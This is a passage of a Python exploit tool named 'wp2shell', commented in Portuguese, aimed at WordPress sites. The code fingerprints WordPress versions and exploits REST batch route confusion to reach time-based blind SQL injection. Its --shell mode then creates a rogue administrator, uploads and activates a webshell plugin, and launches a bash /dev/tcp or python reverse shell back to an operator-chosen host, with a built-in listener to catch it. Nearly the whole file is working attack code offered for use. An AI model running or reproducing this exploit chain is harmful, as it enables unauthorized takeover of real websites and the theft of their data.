        f"            return new WP_REST_Response(array('marker' => '{marker}', 'output' => $o));\n"
        "        },\n"
        "    ));\n"
        "});\n"
    ).encode()


def _revshell_command(lhost: str, lport: int) -> str:
    """Comando de shell que chama de volta; roda sob o plugin de uso único."""
    # Prefere bash /dev/tcp; cai para python3 em hosts sem netredir do bash.
    return (
        f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' "
        f"|| python3 -c \"import socket,os,subprocess,pty;"
        f"s=socket.socket();s.connect(('{lhost}',{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"pty.spawn('/bin/sh')\""
    )


# ---------------------------------------------------------------------------
# Reconhecimento
# ---------------------------------------------------------------------------


class _HomepageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.meta_generators: list[str] = []

    def handle_starttag(self, tag: str, attrs: Iterable[tuple[str, Optional[str]]]) -> None:
        values = {name.lower(): value for name, value in attrs if value is not None}
        if tag.lower() == "meta" and values.get("name", "").lower() == "generator":
            content = values.get("content")
            if content:
                self.meta_generators.append(content)


def _normalize_version(value: str) -> Optional[str]:
    match = _VERSION_RE.search(value)
    return match.group(1) if match else None


def parse_version(version: str) -> Optional[tuple[int, int, int]]:
    normalized = _normalize_version(version)
    if not normalized:
        return None
    parts = [int(part) for part in normalized.split(".")]
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3])


def is_affected_version(version: str) -> bool:
    parsed = parse_version(version)
    if parsed is None:
        return False
    return any(start <= parsed <= end for start, end in AFFECTED_RANGES)


def _safe_get(client: BatchClient, path: str) -> Optional[HttpResponse]:
    try:
        return client.get(path)
    except TargetUnreachableError:
        return None


def _version_from_generator(value: str) -> Optional[str]:
    parsed = urllib.parse.urlparse(value)
    for version in urllib.parse.parse_qs(parsed.query).get("v", []):
        normalized = _normalize_version(version)
        if normalized:
            return normalized
    match = _WORDPRESS_RE.search(value)
    return _normalize_version(match.group(1)) if match else None


def _version_from_wordpress_text(value: str) -> Optional[str]:
    match = _WORDPRESS_RE.search(value)
    return _normalize_version(match.group(1)) if match else None


def wordpress_markers(client: BatchClient) -> tuple[str, ...]:
    markers: list[str] = []
    response = _safe_get(client, "/")
    if response is not None and response.status < 400:
        if "wp-content/" in response.body and "wp-content" not in markers:
            markers.append("wp-content")
        if "wp-includes/" in response.body and "wp-includes" not in markers:
            markers.append("wp-includes")
    for path in ("/wp-json/", "/?rest_route=/"):
        response = _safe_get(client, path)
        if response is None or response.status >= 400:
            continue
        try:
            body = response.json()
        except json.JSONDecodeError:
            body = None
        if isinstance(body, dict) and ("routes" in body or "wp/v2" in response.body):
            if "wp-json" not in markers:
                markers.append("wp-json")
    return tuple(markers)


def public_version_hints(client: BatchClient) -> tuple[VersionHint, ...]:
    hints: list[VersionHint] = []
    seen: set[tuple[str, str]] = set()

    def add(version: Optional[str], source: str, detail: str) -> None:
        if not version:
            return
        key = (version, source)
        if key in seen:
            return
        seen.add(key)
        hints.append(
            VersionHint(
                version=version,
                source=source,
                detail=detail,
                affected=is_affected_version(version),
            )
        )

    for path, source in (
        ("/wp-json/", "gerador da API REST"),
        ("/?rest_route=/", "gerador da API REST (?rest_route=/)"),
    ):
        response = _safe_get(client, path)
        if response is None or response.status >= 400:
            continue
        try:
            body = response.json()
        except json.JSONDecodeError:
            continue
        if isinstance(body, dict):
            generator = body.get("generator")
            if isinstance(generator, str):
                add(_version_from_generator(generator), source, generator)

    response = _safe_get(client, "/")
    if response is not None and response.status < 400:
        parser = _HomepageParser()
        parser.feed(response.body)
        for generator in parser.meta_generators:
            add(_version_from_wordpress_text(generator), "meta generator do HTML", generator)

    return tuple(hints)


# ---------------------------------------------------------------------------
# Comandos CLI
# ---------------------------------------------------------------------------


def _endpoint_modes(preferred_rest_route: bool) -> tuple[bool, ...]:
    """Retorna modos de endpoint a tentar: preferido primeiro, depois o alternativo."""
    return (preferred_rest_route, not preferred_rest_route)


def _endpoint_label(rest_route: bool) -> str:
    return "/?rest_route=/batch/v1" if rest_route else "/wp-json/batch/v1"


def _probe_with_fallback(
    client: BatchClient,
    *,
    preferred_rest_route: bool = False,
) -> HttpResponse:
    """Executa a sonda de marcadores, caindo para a URL batch alternativa se necessário.

    Atualiza ``client.rest_route`` para o endpoint que retornou HTTP 207.
    Se nenhum retornar 207, deixa o cliente no último modo tentado e devolve
    aquela resposta.
    """
    last = HttpResponse(0, 0.0, "")
    for index, rest_route in enumerate(_endpoint_modes(preferred_rest_route)):
        client.rest_route = rest_route
        if index > 0:
            _info(f"{_endpoint_label(not rest_route)} morto → pivotando para {_endpoint_label(rest_route)}")
        last = client.marker_probe()
        if last.status == 207:
            if index > 0:
                _info(f"fixado em {_endpoint_label(rest_route)}")
            return last
    return last


def _print_markers(client: BatchClient) -> tuple[str, ...]:
    markers = wordpress_markers(client)
    if markers:
        _info(f"fingerprint wp: {' '.join(markers)}")
    else:
        _warn("sem fingerprint wp")
    return markers


def _print_version_hints(client: BatchClient) -> tuple[VersionHint, ...]:
    hints = public_version_hints(client)
    if not hints:
        _warn("versão: desconhecida")
        return hints
    for hint in hints:
        tag = "vulnerável" if hint.affected else "limpa"
        _info(f"ver {hint.version} [{tag}] via {hint.source}")
    if any(hint.affected for hint in hints):
        _warn("na faixa de kill — confirme antes de atacar")
    return hints


def _build_client(args: argparse.Namespace) -> BatchClient:
    base_url = resolve_target_url(
        args.url,
        timeout=args.timeout,
        proxy=args.proxy,
        verify_tls=args.verify_tls,
    )
    args.url = base_url
    return BatchClient(
        base_url,
        timeout=max(args.timeout, getattr(args, "sleep", 3.0) + 10),
        rest_route=args.rest_route,
        proxy=args.proxy,
        verify_tls=args.verify_tls,
    )


def run_check(args: argparse.Namespace, *, confirm_sqli: bool = False) -> tuple[int, Optional[BatchClient]]:
    """Sonda o alvo. Retorna (rc, client) quando a confusão de rota está viva."""
    client = _build_client(args)
    hints: tuple[VersionHint, ...] = ()
    if args.force:
        _info("modo force — pulando reconhecimento")
    else:
        markers = _print_markers(client)
        if not markers:
            _error("não é wordpress. --force para ignorar")
            return 1, None
        hints = _print_version_hints(client)

    probe = _probe_with_fallback(client, preferred_rest_route=args.rest_route)
    if probe.status != 207:
        _error(f"batch morto (HTTP {probe.status}) — corrigido ou REST desligado")
        return 1, None

    matched = client.batch_marker_codes(probe)
    if matched:
        _info(f"batch 207 · hits: {', '.join(matched)}")
    else:
        _success("batch aberto (207) — sem sinais de confusão")

    route_confusion = client.has_route_confusion_markers(probe)
    if not route_confusion:
        _error("sem sinal de confusão — parece corrigido")
        if any(hint.affected for hint in hints):
            _warn("versão diz sim, batch diz não")
        return 2, None

    _success("VENCIDO — confusão de rota viva")

    if not confirm_sqli and not args.confirm_sqli:
        return 0, client

    result = BlindSQLi(client, sleep=args.sleep).confirm_timing(samples=TIMING_SAMPLES)
    if result.confirmed:
        _success(f"sqli por tempo — {result.baseline:.2f}s → {result.delayed:.2f}s")
        return 0, client

    _warn(
        f"sqli fria ({result.baseline:.2f}s → {result.delayed:.2f}s) "
        "mas confusão ainda gritando"
    )
    return 0, client


def _default_lhost() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("1.1.1.1", 80))
            return sock.getsockname()[0]
    except OSError:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except OSError:
        return "127.0.0.1"


def _parse_shell_target(values: Optional[list[str]]) -> tuple[str, int]:
    values = values or []
    lhost = _default_lhost()
    lport = DEFAULT_LPORT
    if len(values) >= 1 and values[0]:
        lhost = values[0]
    if len(values) >= 2 and values[1]:
        try:
            lport = int(values[1])
        except ValueError as exc:
            raise Wp2ShellError(f"LPORT inválido: {values[1]!r}") from exc
        if not 1 <= lport <= 65535:
            raise Wp2ShellError(f"LPORT fora de faixa: {lport}")
    if len(values) > 2:
        raise Wp2ShellError("--shell aceita no máximo LHOST e LPORT")
    return lhost, lport


def _interact_revshell(conn: socket.socket) -> None:
    stop = threading.Event()

    def _pump_remote() -> None:
        try:
            while not stop.is_set():
                chunk = conn.recv(4096)
                if not chunk:
                    break
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()
        except OSError:
            pass
        finally:
            stop.set()

    threading.Thread(target=_pump_remote, daemon=True).start()
    try:
        while not stop.is_set():
            line = sys.stdin.buffer.readline()
            if not line:
                break
            conn.sendall(line)
    except (KeyboardInterrupt, EOFError, OSError):
        print()
    finally:
        stop.set()
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        conn.close()


def _catch_revshell(
    lhost: str,
    lport: int,
    *,
    trigger: Callable[[], None],
    accept_timeout: float = REVSHELL_ACCEPT_TIMEOUT,
) -> int:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", lport))
    except OSError as exc:
        _error(f"bind falhou em 0.0.0.0:{lport} — {exc}")
        return 1
    server.listen(1)
    server.settimeout(accept_timeout)
    _info(f"listener armado 0.0.0.0:{lport} ← espera {lhost}:{lport}")

    def _run_trigger() -> None:
        time.sleep(0.4)
        try:
            trigger()
        except Exception as exc:  # noqa: BLE001
            _error(f"gatilho falhou: {exc}")

    threading.Thread(target=_run_trigger, daemon=True).start()
    try:
        conn, addr = server.accept()
    except socket.timeout:
        _error("sem callback — a caixa nunca chamou de volta")
        return 1
    finally:
        server.close()

    _success(f"callback de {addr[0]}:{addr[1]} — você está dentro")
    _interact_revshell(conn)
    return 0


def run_shell(args: argparse.Namespace) -> int:
    """Check → ponte stock oEmbed/admin → plugin → reverse shell."""
    lhost, lport = _parse_shell_target(args.shell)
    _info(f"revshell → {lhost}:{lport}")
    _info("cadeia padrão: escrita oEmbed → elevação changeset → admin → plugin")

    rc, client = run_check(args, confirm_sqli=True)
    if client is None:
        return rc

    sqli = BlindSQLi(client, sleep=args.sleep)
    bridge = StockRCE(client, sqli)
    try:
        admin = bridge.create_admin()
    except Wp2ShellError as exc:
        _error(str(exc))
        return 1
    _success(f"administrador criado: {admin.username}:{admin.password} ({admin.email})")

    _info("logando e enviando plugin webshell de uso único")
    try:
        session = AdminSession.login(
            client._transport.base_url,
            admin.username,
            admin.password,
            timeout=max(args.timeout, 60.0),
            proxy=args.proxy,
            verify_tls=args.verify_tls,
        )
    except Wp2ShellError as exc:
        _error(str(exc))
        return 1

    slug = f"wp2shell-{secrets.token_hex(6)}"
    route = secrets.token_hex(12)
    marker = secrets.token_hex(12)
    try:
        session.upload_and_activate_plugin(slug, _plugin_webshell(slug, route, marker))
    except Wp2ShellError as exc:
        _error(str(exc))
        return 1
    _success("plugin ativo — disparando reverse shell")
    _info("exit / Ctrl+C encerra a sessão; o plugin se apaga após o callback")

    command = _revshell_command(lhost, lport)
    # O REST do plugin precisa bater na mesma origem que a sessão de admin usou (labs SSL, etc.).
    shell_transport = session.transport

    def _trigger() -> None:
        # Longa duração: trava até o reverse shell sair, aí o plugin se apaga.
        saved = shell_transport.timeout
        shell_transport.timeout = max(saved, REVSHELL_ACCEPT_TIMEOUT + 30.0)
        try:
            payload = {"c": base64.b64encode(command.encode()).decode()}
            response = shell_transport.post_json(
                f"/?rest_route=/wp2shell/v1/{route}", payload
            )
            if response.status >= 400:
                raise Wp2ShellError(f"webshell HTTP {response.status}")
            data = response.json()
            if not isinstance(data, dict) or data.get("marker") != marker:
                raise Wp2ShellError("webshell não respondeu corretamente")
        finally:
            shell_transport.timeout = saved

    return _catch_revshell(lhost, lport, trigger=_trigger)


# ---------------------------------------------------------------------------
# Parser de argumentos e ponto de entrada
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="wp2shell",
        description=(
            "SQLi por confusão de rota no batch REST do WordPress → RCE padrão (wp2shell). "
            "Sem args além da URL = checagem de vuln; --shell roda oEmbed→admin→plugin→revshell."
        ),
    )
    parser.add_argument("--version", action="version", version=f"wp2shell {__version__} (x34ElSatan)")
    parser.add_argument(
        "url",
        help=(
            "host ou URL do alvo. Host puro (exemplo.com) sonda https e depois http; "
            "http:// ou https:// trava o esquema"
        ),
    )
    parser.add_argument(
        "--rest-route",
        action="store_true",
        help=(
            "prefere /?rest_route=/batch/v1; por padrão ambos os endpoints são "
            "tentados (/wp-json/batch/v1 primeiro, rest_route em falha)"
        ),
    )
    parser.add_argument("--timeout", type=float, default=30.0, help="timeout de requisição (padrão: 30)")
    parser.add_argument("--proxy", help="proxy HTTP(S), ex.: http://127.0.0.1:8080")
    parser.add_argument(
        "--verify-tls",
        action="store_true",
        help="verifica certificados TLS (padrão: off, para https:// com certificados autoassinados funcionar)",
    )
    parser.add_argument("--sleep", type=float, default=3.0, help="atraso de timing SQL (padrão: 3)")
    parser.add_argument(
        "--confirm-sqli",
        action="store_true",
        help="também roda a sonda ativa de timing SQL durante a checagem",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="pula detecção de marcador/versão WordPress e vai direto para a sonda de batch",
    )
    parser.add_argument(
        "--shell",
        nargs="*",
        metavar=("LHOST", "LPORT"),
        default=None,
        help=(
            "após a checagem: reverse shell stock oEmbed→admin→plugin "
            f"(padrão LHOST=IP local desta máquina, LPORT={DEFAULT_LPORT})"
        ),
    )
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        if args.shell is not None:
            return run_shell(args)
        rc, _client = run_check(args)
        if rc == 0 and not args.confirm_sqli:
            _info("sqli ociosa — passe --confirm-sqli ou --shell para avançar")
        return rc
    except KeyboardInterrupt:
        return 130
    except Wp2ShellError as exc:
        _error(str(exc))
        return 1


if __name__ == "__main__":
    sys.exit(main())
